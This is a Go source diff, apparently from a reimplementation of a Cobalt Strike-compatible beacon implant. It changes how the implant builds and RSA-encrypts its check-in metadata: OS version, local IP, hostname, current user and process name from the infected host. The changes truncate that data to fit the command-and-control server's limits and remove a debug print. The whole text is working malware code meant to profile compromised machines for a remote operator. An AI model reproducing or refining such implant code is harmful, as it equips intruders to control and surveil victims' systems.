@@ -156,21 +156,13 @@ func MakePacket(replyType int, b []byte) []byte {
 
 // EncryptedMetaInfo return raw rsa encrypted data
 func EncryptedMetaInfo() []byte {
-	var tempPacket, packetUnencrypted, packetEncrypted []byte
-	publicKey, err := util.GetPublicKey()
-	// command without computer name
+	var packetUnencrypted []byte
 	if config.Support41Plus {
-		tempPacket = MakeMetaInfo4plus()
-		// no idea for -11 but just copy from issue#4
-		config.ComputerNameLength = publicKey.Size() - len(tempPacket) - 11
 		packetUnencrypted = MakeMetaInfo4plus()
 	} else {
-		tempPacket = MakeMetaInfo()
-		config.ComputerNameLength = publicKey.Size() - len(tempPacket) - 11
 		packetUnencrypted = MakeMetaInfo()
-		util.Println(packetUnencrypted)
 	}
-	packetEncrypted, err = util.RsaEncrypt(packetUnencrypted, publicKey)
+	packetEncrypted, err := util.RsaEncrypt(packetUnencrypted)
 	if err != nil {
 		panic(err)
 	}
@@ -208,7 +200,10 @@ func MakeMetaInfo() []byte {
 	// osInfoBytes
 	// ver,localIP,hostName,currentUser,processName
 	osInfo := util.Sprintf("%s\t%s\t%s\t%s\t%s", osVersion, localIP, hostName, currentUser, processName)
-
+	// the max length of osInfo in CS4.0 is 78, so if it exceeds the limit, just truncate it(process name is the least valuable info)
+	if len(osInfo) > 78 {
+		osInfo = osInfo[:78]
+	}
 	// insert port
 	osInfoBytes := make([]byte, len([]byte(osInfo))+1)
 	osInfoSlicne := []byte(osInfo)
@@ -298,6 +293,10 @@ func MakeMetaInfo4plus() []byte {
 	binary.BigEndian.PutUint32(localIPBytes, localIP)
 
 	osInfo := util.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
+	// the max length of osInfo is 58, so if it exceeds the limit, just truncate it(process name is the least valuable info)
+	if len(osInfo) > 58 {
+		osInfo = osInfo[:58]
+	}
 	osInfoBytes := []byte(osInfo)
 
 	util.Printf("clientID: %d\n", clientID)
